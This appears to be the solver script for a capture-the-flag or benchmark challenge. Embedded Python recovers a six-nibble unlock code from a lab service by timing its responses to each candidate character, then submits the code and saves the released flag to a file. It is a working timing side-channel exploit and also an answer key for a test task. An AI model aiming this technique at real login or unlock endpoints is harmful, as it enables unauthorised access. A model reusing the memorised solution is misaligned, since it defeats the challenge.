#!/usr/bin/env bash
set -euo pipefail

# Manticore (side-channel / timing): /api/unlock leaks the length of the correct prefix through
# response time (it sleeps once per correct leading character before bailing). Recover the 6-nibble
# unlock code character-by-character: at each position, time every candidate nibble and keep the one
# whose MIN-of-repeats response time is largest (one extra sleep = correct). Then submit the full
# code to release the sealed flag. Pure stdlib.

python3 - <<'PY'
import json
import time
import urllib.request
import urllib.error
import urllib.parse

BASE = "http://target:8258"
ALPHABET = "0123456789abcdef"
REPEATS = 4


def unlock(token):
    data = ("token=" + urllib.parse.quote(token)).encode()
    req = urllib.request.Request(BASE + "/api/unlock", data=data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return json.loads(urllib.request.urlopen(req, timeout=30).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def timed(token):
    t0 = time.perf_counter()
    unlock(token)
    return time.perf_counter() - t0


recovered = ""
while True:
    r = unlock(recovered)                       # already correct+complete? release the flag
    if r.get("unlocked"):
        flag = r["sealed"]
        break
    best_c, best_t = None, -1.0
    for c in ALPHABET:
        t = min(timed(recovered + c) for _ in range(REPEATS))   # min beats positive jitter
        if t > best_t:
            best_t, best_c = t, c
    recovered += best_c
    if len(recovered) > 64:                     # safety valve
        raise RuntimeError("recovery overran")

with open("/app/flags.txt", "w") as f:
    f.write(flag.strip() + "\n")
print("recovered unlock code via timing side channel:", recovered, "flag:", flag)
PY
